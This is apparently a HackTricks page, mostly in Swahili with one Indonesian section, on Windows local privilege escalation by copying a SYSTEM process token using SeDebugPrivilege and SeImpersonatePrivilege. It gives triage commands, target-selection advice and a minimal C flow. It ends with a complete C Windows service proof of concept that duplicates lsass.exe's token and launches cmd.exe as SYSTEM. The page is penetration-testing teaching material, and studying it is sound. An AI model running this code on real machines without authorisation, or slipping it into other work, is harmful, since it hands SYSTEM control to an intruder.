# SeDebug + SeImpersonate - Copy Token

{{#include ../../banners/hacktricks-training.md}}

Ukurasa huu unashughulikia toleo la **manual token-theft** ambapo muktadha wa **High Integrity** ambao tayari una **`SeDebugPrivilege`** na **`SeImpersonatePrivilege`** hufungua mchakato unaofaa wa **SYSTEM**, **hu-duplicate token yake**, na **huanzisha process mpya** kwa kutumia token hiyo.

Ikiwa unahitaji tu `SYSTEM` shell ya haraka kutoka kwenye privileged admin process, pia angalia:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

Ikiwa huna njia ya process-handle lakini unayo **`SeImpersonatePrivilege`**, njia ya **named-pipe / Potato** kwa kawaida ni rahisi zaidi:

{{#ref}}
named-pipe-client-impersonation.md
{{#endref}}

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Quick triage

Kabla ya kujaribu njia ya token-copy, thibitisha kwamba current process tayari iko kwenye muktadha unaofaa:
```cmd
whoami /groups | findstr /i "high mandatory"
whoami /priv | findstr /i "SeDebugPrivilege SeImpersonatePrivilege"
```
Notes:

- **`SeDebugPrivilege`** ndicho kinachokuruhusu kufungua michakato mingi ya SYSTEM isiyo **protected** hata wakati DACL yao kwa kawaida ingekuzuia.
- **`SeImpersonatePrivilege`** ndicho kinachofanya **`CreateProcessWithTokenW`** iwe ya vitendo baadaye.
- Ikiwa njia ya token-copy inakupa tu SYSTEM token dhaifu au iliyochujwa, iba kutoka kwenye **different SYSTEM process**.

## Pick the target process carefully

Tekniko hili kwa kawaida huonyeshwa dhidi ya **`lsass.exe`**, lakini kwenye Windows za kisasa hilo mara nyingi huwa **target mbaya**:

- Ikiwa **LSA Protection / RunAsPPL** imewashwa, **`lsass.exe`** inalindwa na admin process ya kawaida yenye `SeDebugPrivilege` bado haitoweza kuifungua.
- Chagua kwa upendeleo **non-PPL SYSTEM processes** kama **`winlogon.exe`**, **`wininit.exe`**, **`services.exe`**, au instance ya mapema ya **`svchost.exe`**.
- **Protected processes** na baadhi ya special processes kama **`System`** au **`csrss.exe`** si targets halisi za user-mode kwa tekniko hili.
- Tumia **Process Hacker / Process Explorer** ukiwa elevated kuthibitisha kama target token kweli ina privileges unazotaka kabla ya kuiduplicate.

## API details that matter in practice

PoC nyingi za umma huomba **`PROCESS_ALL_ACCESS`** na **`TOKEN_ALL_ACCESS`**, lakini hilo ni kelele zaidi kuliko inavyohitajika. Kwa vitendo:

- Fungua target process kwa rights tu unazohitaji (kwa kawaida **`PROCESS_QUERY_INFORMATION`** au **`PROCESS_QUERY_LIMITED_INFORMATION`**).
- Fungua token kwa rights zinazohitajika kwa process creation: **`TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY`**.
- Tumia **`DuplicateTokenEx(..., TokenPrimary, ...)`** kuunda **primary token**; impersonation token pekee haitoshi kuunda process mpya.
- Ikiwa **`CreateProcessWithTokenW`** inashindwa kwa **`1314`**, badili kwenda **`CreateProcessAsUserW`**.
- Ukizindua kutoka kwenye **service / Session 0**, kumbuka kwamba **`CreateProcessWithTokenW`** huacha child katika **session ya caller**. Ukihitaji visible desktop shell, tumia **`CreateProcessAsUserW`** na uhamishe token kwenda session unayotaka.

Flow ya kisasa ya chini kabisa inaonekana kama:
```c
HANDLE hp = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
HANDLE hTok = NULL, hDup = NULL;
OpenProcessToken(hp, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, &hTok);
DuplicateTokenEx(hTok, MAXIMUM_ALLOWED, NULL,
SecurityImpersonation, TokenPrimary, &hDup);
CreateProcessWithTokenW(hDup, LOGON_WITH_PROFILE,
L"C:\\Windows\\System32\\cmd.exe",
NULL, 0, NULL, NULL, &si, &pi);
```
## Full service PoC

Kode berikut **memanfaatkan privilege `SeDebugPrivilege` dan `SeImpersonatePrivilege`** untuk menyalin token dari sebuah **proses yang berjalan sebagai SYSTEM** dan dengan **semua privilege token**. Dalam kasus ini, kode dapat dikompilasi dan digunakan sebagai **binary Windows service** untuk memverifikasi bahwa primitive ini berfungsi.

Bagian utama dari **kode tempat elevasi terjadi** ada di dalam fungsi **`Exploit`**. Di dalam fungsi itu Anda bisa melihat bahwa **`lsass.exe`** dicari, **token**-nya disalin, dan akhirnya token itu digunakan untuk menjalankan **`cmd.exe`** baru dengan semua privilege dari token yang disalin.

Pada host modern, Anda sering ingin mengganti **`lsass.exe`** dengan **proses SYSTEM non-PPL** lain seperti **`winlogon.exe`**, **`wininit.exe`**, atau **`services.exe`**.

Proses lain yang berjalan sebagai SYSTEM dengan semua atau sebagian besar privilege token adalah: **`services.exe`**, **`svchost.exe`** (beberapa yang pertama), **`wininit.exe`**, **`csrss.exe`**... Ingat bahwa Anda umumnya **tidak akan bisa menyalin token dari proses yang dilindungi**.
```c
// From https://cboard.cprogramming.com/windows-programming/106768-running-my-program-service.html
#include <windows.h>
#include <tlhelp32.h>
#include <tchar.h>
#pragma comment (lib, "advapi32")

TCHAR* serviceName = TEXT("TokenDanceSrv");
SERVICE_STATUS serviceStatus;
SERVICE_STATUS_HANDLE serviceStatusHandle = 0;
HANDLE stopServiceEvent = 0;

//This function will find the pid of a process by name
int FindTarget(const char *procname) {

HANDLE hProcSnap;
PROCESSENTRY32 pe32;
int pid = 0;

hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

pe32.dwSize = sizeof(PROCESSENTRY32);

if (!Process32First(hProcSnap, &pe32)) {
CloseHandle(hProcSnap);
return 0;
}

while (Process32Next(hProcSnap, &pe32)) {
if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
pid = pe32.th32ProcessID;
break;
}
}

CloseHandle(hProcSnap);

return pid;
}


int Exploit(void) {

HANDLE hSystemToken, hSystemProcess;
HANDLE dupSystemToken = NULL;
HANDLE hProcess, hThread;
STARTUPINFOA si;
PROCESS_INFORMATION pi;
int pid = 0;


ZeroMemory(&si, sizeof(si));
si.cb = sizeof(si);
ZeroMemory(&pi, sizeof(pi));

// open high privileged process
if ( pid = FindTarget("lsass.exe") )
hSystemProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
else
return -1;

// extract high privileged token
if (!OpenProcessToken(hSystemProcess, TOKEN_ALL_ACCESS, &hSystemToken)) {
CloseHandle(hSystemProcess);
return -1;
}

// make a copy of a token
DuplicateTokenEx(hSystemToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupSystemToken);

// and spawn a new process with higher privs
CreateProcessAsUserA(dupSystemToken, "C:\\windows\\system32\\cmd.exe",
NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

return 0;
}


void WINAPI ServiceControlHandler( DWORD controlCode ) {
switch ( controlCode ) {
case SERVICE_CONTROL_SHUTDOWN:
case SERVICE_CONTROL_STOP:
serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

SetEvent( stopServiceEvent );
return;

case SERVICE_CONTROL_PAUSE:
break;

case SERVICE_CONTROL_CONTINUE:
break;

case SERVICE_CONTROL_INTERROGATE:
break;

default:
break;
}
SetServiceStatus( serviceStatusHandle, &serviceStatus );
}

void WINAPI ServiceMain( DWORD argc, TCHAR* argv[] ) {
// initialise service status
serviceStatus.dwServiceType = SERVICE_WIN32;
serviceStatus.dwCurrentState = SERVICE_STOPPED;
serviceStatus.dwControlsAccepted = 0;
serviceStatus.dwWin32ExitCode = NO_ERROR;
serviceStatus.dwServiceSpecificExitCode = NO_ERROR;
serviceStatus.dwCheckPoint = 0;
serviceStatus.dwWaitHint = 0;

serviceStatusHandle = RegisterServiceCtrlHandler( serviceName, ServiceControlHandler );

if ( serviceStatusHandle ) {
// service is starting
serviceStatus.dwCurrentState = SERVICE_START_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

// do initialisation here
stopServiceEvent = CreateEvent( 0, FALSE, FALSE, 0 );

// running
serviceStatus.dwControlsAccepted |= (SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
serviceStatus.dwCurrentState = SERVICE_RUNNING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

Exploit();
WaitForSingleObject( stopServiceEvent, -1 );

// service was stopped
serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

// do cleanup here
CloseHandle( stopServiceEvent );
stopServiceEvent = 0;

// service is now stopped
serviceStatus.dwControlsAccepted &= ~(SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
serviceStatus.dwCurrentState = SERVICE_STOPPED;
SetServiceStatus( serviceStatusHandle, &serviceStatus );
}
}


void InstallService() {
SC_HANDLE serviceControlManager = OpenSCManager( 0, 0, SC_MANAGER_CREATE_SERVICE );

if ( serviceControlManager ) {
TCHAR path[ _MAX_PATH + 1 ];
if ( GetModuleFileName( 0, path, sizeof(path)/sizeof(path[0]) ) > 0 ) {
SC_HANDLE service = CreateService( serviceControlManager,
serviceName, serviceName,
SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
SERVICE_AUTO_START, SERVICE_ERROR_IGNORE, path,
0, 0, 0, 0, 0 );
if ( service )
CloseServiceHandle( service );
}
CloseServiceHandle( serviceControlManager );
}
}

void UninstallService() {
SC_HANDLE serviceControlManager = OpenSCManager( 0, 0, SC_MANAGER_CONNECT );

if ( serviceControlManager ) {
SC_HANDLE service = OpenService( serviceControlManager,
serviceName, SERVICE_QUERY_STATUS | DELETE );
if ( service ) {
SERVICE_STATUS serviceStatus;
if ( QueryServiceStatus( service, &serviceStatus ) ) {
if ( serviceStatus.dwCurrentState == SERVICE_STOPPED )
DeleteService( service );
}
CloseServiceHandle( service );
}
CloseServiceHandle( serviceControlManager );
}
}

int _tmain( int argc, TCHAR* argv[] )
{
if ( argc > 1 && lstrcmpi( argv[1], TEXT("install") ) == 0 ) {
InstallService();
}
else if ( argc > 1 && lstrcmpi( argv[1], TEXT("uninstall") ) == 0 ) {
UninstallService();
}
else  {
SERVICE_TABLE_ENTRY serviceTable[] = {
{ serviceName, ServiceMain },
{ 0, 0 }
};

StartServiceCtrlDispatcher( serviceTable );
}

return 0;
}
```
## Marejeo

- [CreateProcessWithTokenW function (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [Configure added LSA protection (Microsoft Learn)](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)
{{#include ../../banners/hacktricks-training.md}}
